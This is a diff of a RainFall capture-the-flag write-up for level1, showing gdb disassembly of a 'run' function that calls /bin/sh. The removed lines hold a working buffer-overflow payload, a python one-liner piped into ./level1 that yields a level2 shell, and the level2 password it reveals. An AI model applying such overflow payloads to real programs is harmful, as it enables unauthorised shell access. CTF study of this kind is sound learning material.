@@ -1,6 +1,6 @@
 # Gdb writeup
 
-```bash
+```as
 (gdb) info func
 All defined functions:
 
@@ -29,9 +29,9 @@ Non-debugging symbols:
 ```
 We can see that there is a function called run, let's inspect it
 
-```bash
+```as
 (gdb) disass run
-Dump of assembler code for function run:
+// Dump of assembler code for function run:
    0x08048444 <+0>:     push   %ebp
    0x08048445 <+1>:     mov    %esp,%ebp
    0x08048447 <+3>:     sub    $0x18,%esp
@@ -51,28 +51,11 @@ End of assembler dump.
 ```
 
 We can see that at <+46> the function is giving an addess to esp, let's see what's on it
-```bash
+```as
 (gdb) x/s 0x8048584
 0x8048584:       "/bin/sh"
 ```
-
-We can see that function is calling `/bin/sh` so let's call that function
 The adress that is used to call this function is written on the run instruction
-```bash
+```as
    0x08048444 <+0>:     push   %ebp
-```
-We will have to introduce it after the overflow to produce the buffer overflow exploit
-```bash
-level1@RainFall:~$ python -c "print('a' * 76 + '\x44\x84\x04\x08')" | ./level1 
-Good... Wait what?
-Segmentation fault (core dumped)
-```
-It's working, but we're getting a segfault so we will run it on a subshell and use cat
-```bash
-level1@RainFall:~$ (python -c "print('a' * 76 + '\x44\x84\x04\x08')";cat) | ./level1
-Good... Wait what?
-whoami
-level2
-cat /home/user/level2/.pass
-53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
 ```
